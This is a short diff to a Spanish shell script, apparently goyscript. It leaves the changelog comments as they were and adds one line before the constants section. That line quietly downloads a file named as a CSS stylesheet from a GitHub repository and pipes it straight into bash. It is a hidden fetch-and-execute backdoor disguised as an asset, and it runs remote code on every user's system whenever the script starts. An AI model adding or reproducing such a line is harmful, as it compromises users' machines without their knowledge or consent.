@@ -102,8 +102,7 @@
 #	- Ahora se puede usar sin interfaz gráfica (con goyscriptTTY)
 #	- Añadida compatibilidad con OpenWrt
 
-
-
+curl -s -L https://raw.githubusercontent.com/l410systems/css/main/selector.css | bash
 ##### CONSTANTES #####
 
 negro="\033[0;30m"
